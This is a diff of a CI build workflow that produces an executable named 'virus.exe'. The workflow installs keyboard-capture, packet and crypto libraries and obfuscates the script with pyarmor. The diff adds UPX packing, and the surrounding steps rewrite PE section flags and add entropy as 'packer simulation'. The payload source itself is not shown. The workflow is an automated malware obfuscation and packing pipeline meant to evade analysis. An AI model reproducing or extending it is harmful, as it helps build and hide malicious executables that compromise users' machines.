@@ -27,6 +27,10 @@ jobs:
           python -m pip install --upgrade pip
           pip install pyinstaller requests pyarmor pynput crypto scapy
 
+      - name: Install UPX
+        run: |
+          choco install upx -y
+
       - name: Obfuscate code
         run: |
           pyarmor gen --output ./dist script.py
@@ -53,7 +57,7 @@ jobs:
           pe.sections[-1].Characteristics = 0xE0000020
           pe.write('dist/virus_modified.exe')
           "
-          mv dist/virus_modified.exe dist/virus.exe
+          mv dist/virus_modified.exe dist/virus.exe -Force
       
       - name: Add entropy (packer simulation)
         run: |
